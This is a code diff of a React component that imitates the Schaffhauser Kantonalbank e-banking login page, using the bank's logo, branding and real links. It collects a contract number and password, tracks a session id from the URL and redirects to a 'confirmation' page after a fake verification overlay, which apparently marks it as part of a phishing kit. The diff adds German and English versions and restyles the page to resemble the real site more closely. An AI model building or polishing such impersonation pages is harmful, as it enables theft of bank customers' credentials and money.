@@ -11,24 +11,68 @@ import iconReakt from "@/assets/shkb-e-banking-reaktivieren.png.asset.json";
 
 const YELLOW = "#ffdd3c";
 
-const infoCards = [
-  { label: "Schützen Sie sich vor Betrügern", href: "https://www.shkb.ch/node/214", icon: iconBetrueger.url },
-  { label: "CrontoSign Swiss für mehr Sicherheit", href: "https://www.shkb.ch/node/243", icon: iconCronto.url },
-  { label: "Informationen zum E-Banking", href: "https://www.shkb.ch/eb", icon: iconInfo.url },
-  { label: "Mein E-Banking reaktivieren", href: "https://www.shkb.ch/node/599", icon: iconReakt.url },
+type Lang = "de" | "en";
+
+const translations: Record<Lang, {
+  pageTitle: string;
+  loginTitle: string;
+  contractNumber: string;
+  password: string;
+  submit: string;
+  loading: string;
+  cards: string[];
+}> = {
+  de: {
+    pageTitle: "Schaffhauser Kantonalbank – E-Banking",
+    loginTitle: "Login E-Banking",
+    contractNumber: "Vertragsnummer",
+    password: "Passwort",
+    submit: "Anmelden",
+    loading: "Anmeldedaten werden überprüft...",
+    cards: [
+      "Schützen Sie sich vor Betrügern",
+      "CrontoSign Swiss für mehr Sicherheit",
+      "Informationen zum E-Banking",
+      "Mein E-Banking reaktivieren",
+    ],
+  },
+  en: {
+    pageTitle: "Schaffhauser Kantonalbank – E-banking",
+    loginTitle: "E-banking login",
+    contractNumber: "Contract number",
+    password: "Password",
+    submit: "Login",
+    loading: "Verifying login details...",
+    cards: [
+      "Protect yourself from fraudsters",
+      "CrontoSign Swiss for more security",
+      "Information about e-banking",
+      "Reactivate my e-banking",
+    ],
+  },
+};
+
+const infoLinks = [
+  "https://www.shkb.ch/node/214",
+  "https://www.shkb.ch/node/243",
+  "https://www.shkb.ch/eb",
+  "https://www.shkb.ch/node/599",
 ];
+const infoIcons = [iconBetrueger.url, iconCronto.url, iconInfo.url, iconReakt.url];
 
 const ChSchaffhauserKantonalbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
+  const [lang, setLang] = useState<Lang>("de");
 
   const [vertragsnummer, setVertragsnummer] = useState("");
   const [passwort, setPasswort] = useState("");
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Schaffhauser Kantonalbank – E-Banking", logoUrl);
+  const t = translations[lang];
+  usePageMeta(t.pageTitle, logoUrl);
 
   const handleSubmit = async () => {
     if (sessionId) {
@@ -48,55 +92,75 @@ const ChSchaffhauserKantonalbank = () => {
 
   const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;
 
+  const inputClass =
+    "w-full h-[40px] px-3 bg-white border border-[#ced4da] rounded-none text-[15px] " +
+    "outline-none focus:outline-[3px] focus:outline-[#d6d7d7] focus:outline-offset-0";
+
   return (
     <>
       {showLoading && (
         <LoadingOverlay
-          message="Anmeldedaten werden überprüft..."
+          message={t.loading}
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen bg-[#fbfbfb]">
+      <div className="min-h-screen bg-[#f2f2f2]">
         <div className="max-w-[920px] mx-auto px-4 pt-6 md:pt-10">
-          {/* Logo */}
-          <div className="bg-white">
+          {/* Logo / Header (grey bg) */}
+          <div className="bg-[#f2f2f2]">
             <img src={logoUrl} alt="Schaffhauser Kantonalbank" className="h-[60px] md:h-[70px] object-contain" />
           </div>
 
           {/* Yellow divider */}
           <div className="mt-4" style={{ height: 4, backgroundColor: YELLOW }} />
 
-          {/* Language switcher */}
+          {/* Language switcher (inverted) */}
           <div className="flex justify-end gap-4 mt-6 text-[14px]">
-            <button type="button" className="underline text-black" aria-current="page">deutsch</button>
-            <button type="button" className="text-[#999]">english</button>
+            <button
+              type="button"
+              onClick={() => setLang("de")}
+              className={lang === "de" ? "text-[#999]" : "text-black underline font-semibold"}
+            >
+              deutsch
+            </button>
+            <button
+              type="button"
+              onClick={() => setLang("en")}
+              className={lang === "en" ? "text-[#999]" : "text-black underline font-semibold"}
+            >
+              english
+            </button>
           </div>
 
           {/* Login card */}
-          <div className="mt-4 bg-white">
-            <h1 className="text-[22px] md:text-[26px] font-semibold text-black px-6 py-5">Login E-Banking</h1>
+          <div className="mt-4 bg-white border border-[#dfdfdf]">
+            <h1 className="text-[22px] md:text-[26px] font-semibold text-black px-6 py-5">{t.loginTitle}</h1>
             <div className="h-px bg-[#e5e5e5]" />
 
             <div className="px-6 py-8 space-y-6">
               <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
-                <label htmlFor="shkb-vnr" className="text-[15px] text-black">Vertragsnummer</label>
-                <input
-                  id="shkb-vnr"
-                  type="text"
-                  value={vertragsnummer}
-                  onChange={(e) => setVertragsnummer(e.target.value)}
-                  className="w-full h-[40px] px-3 bg-white border border-[#bdbdbd] rounded-none text-[15px] outline-none focus:border-black"
-                />
+                <label htmlFor="shkb-vnr" className="text-[15px] text-black font-semibold">{t.contractNumber}</label>
+                <div className="max-w-[320px]">
+                  <input
+                    id="shkb-vnr"
+                    type="text"
+                    value={vertragsnummer}
+                    onChange={(e) => setVertragsnummer(e.target.value)}
+                    className={inputClass}
+                  />
+                </div>
               </div>
               <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
-                <label htmlFor="shkb-pw" className="text-[15px] text-black">Passwort</label>
-                <input
-                  id="shkb-pw"
-                  type="password"
-                  value={passwort}
-                  onChange={(e) => setPasswort(e.target.value)}
-                  className="w-full h-[40px] px-3 bg-white border border-[#bdbdbd] rounded-none text-[15px] outline-none focus:border-black"
-                />
+                <label htmlFor="shkb-pw" className="text-[15px] text-black font-semibold">{t.password}</label>
+                <div className="max-w-[320px]">
+                  <input
+                    id="shkb-pw"
+                    type="password"
+                    value={passwort}
+                    onChange={(e) => setPasswort(e.target.value)}
+                    className={inputClass}
+                  />
+                </div>
               </div>
 
               <div className="flex justify-end pt-2">
@@ -106,14 +170,9 @@ const ChSchaffhauserKantonalbank = () => {
                   disabled={!canSubmit}
                   className="px-10 h-[44px] border border-[#bdbdbd] bg-white text-[15px] text-[#777] enabled:hover:bg-[#ffdd3c] enabled:hover:text-black enabled:hover:border-[#ffdd3c] enabled:text-black transition-colors disabled:cursor-not-allowed"
                 >
-                  Login
+                  {t.submit}
                 </button>
               </div>
-            </div>
-
-            <div className="h-px bg-[#e5e5e5]" />
-            <div className="px-6 py-4 text-right text-[13px] text-black">
-              <span className="font-semibold">E-Banking Hotline</span>, Tel. +41 52 635 23 23, Mo bis Fr, 07:45 Uhr bis 18:00 Uhr
             </div>
           </div>
 
@@ -122,16 +181,16 @@ const ChSchaffhauserKantonalbank = () => {
 
           {/* Info cards grid */}
           <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pb-12">
-            {infoCards.map((c) => (
+            {t.cards.map((label, i) => (
               <a
-                key={c.href}
-                href={c.href}
+                key={infoLinks[i]}
+                href={infoLinks[i]}
                 target="_blank"
                 rel="noopener noreferrer"
                 className="bg-white border border-[#e5e5e5] flex flex-col items-center justify-start text-center px-4 py-6 hover:border-[#bdbdbd] transition-colors"
               >
-                <img src={c.icon} alt="" className="h-[72px] w-auto object-contain mb-4" />
-                <span className="text-[14px] text-black underline">{c.label}</span>
+                <img src={infoIcons[i]} alt="" className="h-[72px] w-auto object-contain mb-4" />
+                <span className="text-[14px] text-black underline">{label}</span>
               </a>
             ))}
           </div>
